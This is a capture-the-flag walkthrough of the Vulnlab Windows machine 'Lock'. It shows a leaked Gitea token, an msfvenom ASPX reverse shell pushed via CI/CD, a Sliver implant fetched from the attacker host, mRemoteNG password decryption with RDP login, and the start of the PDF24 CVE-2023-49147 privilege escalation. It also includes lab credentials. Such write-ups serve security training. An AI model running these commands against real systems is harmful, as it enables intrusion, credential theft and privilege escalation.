---
Category: Vulnlab/Machines
tags:
  - Vulnlab
  - Machine
  - Windows
  - Easy
  - Gitea
  - AccessToken
  - CICD
  - mRemoteNG
  - RDP
  - CVE-2023-49147
  - PDF24Creator
  - LocalPrivilegeEscalation
---

![](https://vulnlab-assets.s3.eu-central-1.amazonaws.com/lock_slide.png)

## Summary

The box starts with enumeration of port `3000/TCP`. By exploring the publicly available repositories a repository called `dev-scripts` by the user `Ellen Freeman` can be found which contains a `PERSONAL_ACCESS_TOKEN` in the `initial commit`. By executing the script `repos.py` which contains the token locally, a `private repository` can be found. A `readme.md` inside gives the hint that any file which is being pushed to the repository is getting deployed on the web server via `Continuous Integration and Continuous Delivery (CI/CD)`. For the foothold creating a simple `aspx reverse shell` grants access to the box. Inside the `Documents` folder of `Ellen Freeman` a `configuration file` called `config.xml` for `mRemoteNG` is the step for the `privilege escalation` to `Gale Dekarios`. The password can be extracted by using `mRemoteNG_password_decrypt`. After the login using `RDP` the `user.txt` can be obtained. At least at this point after some enumeration an third-party application `PDF24` can be found installed on the system. A folder `_install` contains a file called `pdf24-creator-11.15.1-x64.msi`. Doing research on the version of the application brings up `CVE-2023-49147` which is a `Local Privilege Escalation (LPE)` using `PDF24` installed as `.msi` file. Using `SetOpLock.exe` to set a lock on `C:\Program Files\PDF24\faxPrnInst.log` is required to stop the `repair process` of `PDF24` at a point were it uses `NT Authority\System` privileges. After starting the `repair process` it stops and leaves a blank `cmd shell` on the screen. Accessing a `help page` by `Microsoft` using the `cmd shell properties window` allows to open `Firefox` and as last step to spawn another `cmd shell` as `NT Authory\System`.

## Table of Contents

- [Reconnaissance](#reconnaissance)
    - [Port Scanning](#port-scanning)
    - [SMB Enumeration](#smb-enumeration)
    - [Enumeration of Port 80/TCP](#enumeration-of-port-80tcp)
    - [Enumeration of Port 3000/TCP](#enumeration-of-port-3000tcp)
- [Foothold](#foothold)
- [Persistence](#persistence)
- [Enumeration](#enumeration)
- [Privilege Escalation](#privilege-escalation)
    - [Decrypt mRemoteNG Hash](#decrypt-mremoteng-hash)
    - [Login as Gale Dekarios](#login-as-gale-dekarios)
- [user.txt](#usertxt)
- [Pivoting](#pivoting)
- [Privilege Escalation](#privilege-escalation)
    - [CVE-2023-49147: PDF24 Creator 11.15.1 Local Privilege Esclation](#cve-2023-49147-pdf24-Creator-11151-local-privilege-esclation)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

As always `xct` already provided the list of ports to avoid spikes in traffic due to `port scanning`.

- [https://wiki.vulnlab.com/guidance/easy/lock](https://wiki.vulnlab.com/guidance/easy/lock)

```c
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
```

### SMB Enumeration

I made a quick check on `SMB` but had no free access.

```c
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.87.100 -u '' -p '' --shares 
SMB         10.10.87.100    445    LOCK             [*] Windows 10.0 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False)
SMB         10.10.87.100    445    LOCK             [-] Lock\: STATUS_ACCESS_DENIED 
SMB         10.10.87.100    445    LOCK             [-] Error getting user: list index out of range
SMB         10.10.87.100    445    LOCK             [-] Error enumerating shares: Error occurs while reading from remote(104)
```

```c
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.87.100 -u 'Guest' -p '' --shares
SMB         10.10.87.100    445    LOCK             [*] Windows 10.0 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False)
SMB         10.10.87.100    445    LOCK             [-] Lock\Guest: STATUS_ACCOUNT_DISABLED
```

### Enumeration of Port 80/TCP

Port `80/TCP` ran a random website with nothing of interest on it.

- [http://10.10.87.100/](http://10.10.87.100/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.10.87.100/ 
http://10.10.87.100/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.87.100], Lightbox, Microsoft-IIS[10.0], Script, Title[Lock - Index], X-Powered-By[ASP.NET]
```

### Enumeration of Port 3000/TCP

On port `3000/TCP` I found an `Gitea` instance and started enumerating it.

- [http://10.10.87.100:3000/](http://10.10.87.100:3000/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.10.87.100:3000/
http://10.10.87.100:3000/ [200 OK] Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HttpOnly[_csrf,i_like_gitea], IP[10.10.87.100], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]
```

Checking the `Explorer` button showed the user `ellen.freeman` with a `public repository` called `dev-scripts`.

![](images/2024-03-23_05-53_gittea_explore.png)

| Username      |
| ------------- |
| ellen.freeman |

The repository contained a `python script` to authenticate with `Gitea` and display all available repositories for the user.

![](images/2024-03-23_05-53_gittea_explore_dev-scripts.png)

![](images/2024-03-23_05-53_gittea_explore_dev-scripts_repospy.png)

As always I checked the `history` of the `repository`. There was one more `commit` which contained a `PERSONAL_ACCESS_TOKEN`.

![](images/2024-03-23_05-53_gittea_explore_dev-scripts_repospy_history.png)

![](images/2024-03-23_05-53_gittea_explore_dev-scripts_repospy_history_token.png)

| PERSONAL_ACCESS_TOKEN                    |
| ---------------------------------------- |
| 43ce39bb0bd6bc489284f2905f033ca467a6362f |

```python
┌──(kali㉿kali)-[/media/…/Vulnlab/Machines/Lock/files]
└─$ cat repos.py 
import requests
import sys

# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    try:
        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

By running the version of the script from the `initial commit`, containing the `PERSONAL_ACCESS_TOKEN`, I was able to find another repository called `website`.

```c
┌──(kali㉿kali)-[/media/…/Vulnlab/Machines/Lock/files]
└─$ python3 repos.py http://10.10.87.100:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

## Foothold

I cloned the repository to see what was inside.

```c
┌──(kali㉿kali)-[/media/…/Vulnlab/Machines/Lock/files]
└─$ git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.87.100:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.78 MiB/s, done.
Resolving deltas: 100% (35/35), done.
Updating files: 100% (126/126), done.
```

The `readme.md` pointed out that all submitted files would be automatically deployed on the `webserver` via `Continuous Integration and Continuous Delivery (CI/CD)`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ cat readme.md 
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

For the foothold I generated an `aspx reverse shell` using `msfvenom`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.2 LPORT=8443 -f aspx -o shell.aspx
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3396 bytes
Saved as: shell.aspx
```

I configured the repository locally and added the file using basic `git commands`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ git add .
fatal: detected dubious ownership in repository at '/media/sf_infosec/InfoSec/Vulnlab/Machines/Lock/files/website'
To add an exception for this directory, call:

        git config --global --add safe.directory /media/sf_infosec/InfoSec/Vulnlab/Machines/Lock/files/website
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ git config --global --add safe.directory /media/sf_infosec/InfoSec/Vulnlab/Machines/Lock/files/website
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ git config --global user.name "ellen.freeman"
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ git config --global user.email ellen.freeman@lock.vl
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ git commit -m "added shell.aspx"
[main d01689b] added shell.aspx
 1 file changed, 45 insertions(+)
 create mode 100644 shell.aspx
```

As last step I `pushed` the changed to the `remote repository` using the `PERSONAL_ACCESS_TOKEN` which I found earlier.

```c
┌──(kali㉿kali)-[/media/…/Machines/Lock/files/website]
└─$ git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.87.100:3000/ellen.freeman/website.git    
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 1.42 KiB | 728.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.87.100:3000/ellen.freeman/website.git
   73cdcc1..d01689b  main -> main
```

To trigger the payload I just had to access it using my browser.

- [http://10.10.87.100/shell.aspx](http://10.10.87.100/shell.aspx)

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8443
listening on [any] 8443 ...
connect to [10.8.0.2] from (UNKNOWN) [10.10.87.100] 50311
Microsoft Windows [Version 10.0.20348.2159]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

## Persistence

I performed my basic `Tactics, Techniques and Procedures (TTPs)` when gaining foothold to make sure I don't kill my shell by accident.

```c
┌──(kali㉿kali)-[~]
└─$ sliver
Connecting to localhost:31337 ...
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain living weapon
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
```

```c
sliver > generate --http 10.8.0.2:8888 --os windows --arch amd64 --disable-sgn --format exe --save /media/sf_infosec/InfoSec/Vulnlab/Machines/Lock/serve/sliver.exe

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 30s
[*] Implant saved to /media/sf_infosec/InfoSec/Vulnlab/Machines/Lock/serve/sliver.exe
```

```c
sliver > http --lport 8888

[*] Starting HTTP :8888 listener ...
[*] Successfully started job #1
```

```c
┌──(kali㉿kali)-[/media/…/Vulnlab/Machines/Lock/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
PS C:\temp> iwr 10.8.0.2:8000/sliver.exe -o sliver.exe
iwr 10.8.0.2:8000/sliver.exe -o sliver.exe
```

```c
sliver > http --lport 8888

[*] Starting HTTP :8888 listener ...
[*] Successfully started job #1
```

```c
[*] Session 11a3cbbb OVERSEAS_APPEAL - 10.10.87.100:50483 (Lock) - windows/amd64 - Sat, 23 Mar 2024 06:46:00 EDT
```

## Enumeration

After completing the `persistence setup` I moved forward with some basic enumeration.

```c
PS C:\> whoami /all
whoami /all

USER INFORMATION
----------------
User Name          SID                                           
================== ==============================================
lock\ellen.freeman S-1-5-21-3479006486-3698385926-2473385619-1000


GROUP INFORMATION
-----------------
Group Name                             Type             SID                                                           Attributes                                        
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\DefaultAppPool             Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeAuditPrivilege              Generate security audits           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
```

In `C:\Users\` I found a potential target for `privilege escalation` called `Gale Dekarios`.

```c
PS C:\Users> dir 
dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
d-----        12/27/2023   2:00 PM                .NET v4.5                      
d-----        12/27/2023   2:00 PM                .NET v4.5 Classic              
d-----        12/27/2023  12:01 PM                Administrator                  
d-----        12/28/2023  11:36 AM                ellen.freeman                  
d-----        12/28/2023   6:14 AM                gale.dekarios                  
d-r---        12/27/2023  10:21 AM                Public
```

| Username      |
| ------------- |
| gale.dekarios |

Since I only could access the `home directory` of the current user `Ellen Freeman` I took a closer look on each of his folders.

```c
PS C:\Users\ellen.freeman> dir
dir


    Directory: C:\Users\ellen.freeman


Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
d-----        12/27/2023  11:11 AM                .ssh                           
d-r---        12/28/2023   5:58 AM                3D Objects                     
d-r---        12/28/2023   5:58 AM                Contacts                       
d-r---        12/28/2023   6:11 AM                Desktop                        
d-r---        12/28/2023   5:59 AM                Documents                      
d-r---        12/28/2023   5:58 AM                Downloads                      
d-r---        12/28/2023   5:58 AM                Favorites                      
d-r---        12/28/2023   5:58 AM                Links                          
d-r---        12/28/2023   5:58 AM                Music                          
d-r---        12/28/2023   5:58 AM                Pictures                       
d-r---        12/28/2023   5:58 AM                Saved Games                    
d-r---        12/28/2023   5:58 AM                Searches                       
d-r---        12/28/2023   5:58 AM                Videos                         
-a----        12/28/2023  11:38 AM             52 .git-credentials               
-a----        12/28/2023  11:35 AM            158 .gitconfig
```

The file `.git-credentials` contained his actual credentials but they had no use at this point.

```c
PS C:\Users\ellen.freeman> type .git-credentials
type .git-credentials
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
```

| Username      | Password         |
| ------------- | ---------------- |
| ellen.freeman | YWFrWJk9uButLeqx |

But the `Documents` folder contained a `config.xml` which was a `configuration file` for a tool called `mRemoteNG`.

```c
PS C:\Users\ellen.freeman\Documents> dir
dir


    Directory: C:\Users\ellen.freeman\Documents


Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
-a----        12/28/2023   5:59 AM           3341 config.xml
```

```c
PS C:\Users\ellen.freeman\Documents> type config.xml
type config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

## Privilege Escalation

### Decrypt mRemoteNG Hash

I downloaded the `config.xml` to my local machine and used `mRemoteNG_password_decrypt` to get the `password` of `Gale Dekarios`.

- [https://github.com/gquere/mRemoteNG_password_decrypt](https://github.com/gquere/mRemoteNG_password_decrypt)

```c
┌──(kali㉿kali)-[/media/…/Vulnlab/Machines/Lock/files]
└─$ python3 mRemoteNG_password_decrypt/mremoteng_decrypt.py config.xml 
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```

| Username      | Password         |
| ------------- | ---------------- |
| Gale.Dekarios | ty8wnW9qCKDosXo6 |

### Login as Gale Dekarios

Unfortunately `WinRM` was not an option and I had issues with callbacks from the box which I went for access using `xfreerdp`.

```c
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:10.10.87.100 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /dynamic-resolution +clipboard
[07:06:24:487] [54087:54088] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:06:24:487] [54087:54088] [WARN][com.freerdp.crypto] - CN = Lock
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.87.100:3389) 
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] -      Lock
[07:06:24:489] [54087:54088] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.87.100:3389 (RDP-Server):
        Common Name: Lock
        Subject:     CN = Lock
        Issuer:      CN = Lock
        Thumbprint:  51:cd:93:f8:aa:f6:f9:09:60:99:cc:54:91:06:f0:4f:7e:f2:7a:f2:21:e7:b5:ec:fc:e0:b9:78:46:b4:db:96
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[07:06:28:166] [54087:54088] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:06:28:166] [54087:54088] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:06:28:232] [54087:54088] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:06:28:232] [54087:54088] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[07:06:28:233] [54087:54088] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[07:06:30:873] [54087:54088] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

![](images/2024-03-23_07-14_rdp.png)

I moved to the directory where I placed my `sliver payload` in before and executed it to gain a callback as `gale.dekarios` and to ensure persistence.

```c
[*] Session 1649edb0 OVERSEAS_APPEAL - 10.10.87.100:51573 (Lock) - windows/amd64 - Sat, 23 Mar 2024 07:15:25 EDT
```

## user.txt

The user `Gale Dekarios` held the `user.txt` which I accessed via `Sliver` for documentation purposes.

```c
sliver (OVERSEAS_APPEAL) > ls

C:\Users\gale.dekarios\Desktop (2 items, 318 B)
===============================================
-rw-rw-rw-  desktop.ini  282 B  Thu Dec 28 07:14:54 -0700 2023
-rw-rw-rw-  user.txt     36 B   Thu Dec 28 07:15:03 -0700 2023
```

```c
sliver (OVERSEAS_APPEAL) > cat user.txt
VL{REDACTED}
```

## Pivoting

While repeating the process of `basic enumeration` during the `pivoting phase` of the new user, I stumbled upon `PDF24`.

```c
PS C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    AzureArcSetup    REG_EXPAND_SZ    %windir%\AzureArcSetup\Systray\AzureArcSysTray.exe
    PDF24    REG_SZ    "C:\Program Files\PDF24\pdf24.exe"
```

To dig deeper into it I moved `Seatbelt` to the box. Shout out to `Flangvik` for maintaining his amazing repository!

- [https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_x64/Seatbelt.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_x64/Seatbelt.exe)

```c
PS C:\temp> .\Seatbelt.exe -group=system
.\Seatbelt.exe -group=system


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,
```

```c
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

 ProcessName                              : pdf24
 ProcessId                                : 4940
 ParentProcessId                          : 3636
 CompanyName                              : geek software GmbH
 Description                              : PDF24 Backend
 Version                                  : 11.15.1
 Path                                     : C:\Program Files\PDF24\pdf24.exe
 CommandLine                              : "C:\Program Files\PDF24\pdf24.exe" 
 IsDotNet                                 : False
 ProcessProtectionInformation             :
```

```c
====== Services ======

Non Microsoft Services (via WMI)
<--- CUT FOR BREVITY --->
Name                           : PDF24
  DisplayName                    : PDF24
  Description                    : PDF24 Printer Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  Type                           : Own Process
  ServiceCommand                 : "C:\Program Files\PDF24\pdf24.exe" -service
  BinaryPath                     : C:\Program Files\PDF24\pdf24.exe
  BinaryPathSDDL                 : O:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : geek software GmbH
  FileDescription                : PDF24 Backend
  Version                        : 11.15.1
  IsDotNet                       : False
```

Since I was `not able` to `restart the service`, I started looking for `hidden files` top down from the root directory of Windows which contained a `hidden folder` called `_install`.

```c
PS C:\> GCI -hidden
GCI -hidden


    Directory: C:\


Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
d--hs-        12/28/2023   6:17 AM                $Recycle.Bin                   
d--h--        12/27/2023  12:38 PM                $WinREAgent                    
d--hsl        12/27/2023   6:14 PM                Documents and Settings         
d--h--        12/28/2023  11:24 AM                ProgramData                    
d--hs-        12/27/2023   6:14 PM                Recovery                       
d--hs-        12/27/2023   6:14 PM                System Volume Information      
d--h--        12/28/2023  11:23 AM                _install                       
-a-hs-         3/23/2024   2:47 AM          12288 DumpStack.log.tmp              
-a-hs-         3/23/2024   2:47 AM     1207959552 pagefile.sys
```

Inside the directory I found the file `pdf24-creator-11.15.1-x64.msi` which was used for installing `PDF24`.

```c
PS C:\_install> dir
dir


    Directory: C:\_install


Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
-a----        12/28/2023  11:21 AM       60804608 Firefox Setup 121.0.msi        
-a----        12/28/2023   5:39 AM       43593728 mRemoteNG-Installer-1.76.20.24615.msi
-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi
```

## Privilege Escalation 

### CVE-2023-49147: PDF24 Creator 11.15.1 Local Privilege Esclation

I did some research on it and found a matching `Local Privilege Escalation (LPE)` on `Packet Storm`. Good stuff indeed.

- [https://packetstormsecurity.com/files/176206/PDF24-Creator-11.15.1-Local-Privilege-Escalation.html](https://packetstormsecurity.com/files/176206/PDF24-Creator-11.15.1-Local-Privilege-Escalation.html)

```c
Proof of concept:
-----------------
1) Local Privilege Escalation via MSI installer (CVE-2023-49147)
For the exploit to work, the PDF24 Creator has to be installed via the MSI file.
Afterwards, any low-privileged user can run the following command to start the
repair of PDF24 Creator and trigger the vulnerable actions without a UAC popup:

msiexec.exe /fa <PATH TO INSTALLERFILE>\pdf24-creator-11.14.0-x64.msi

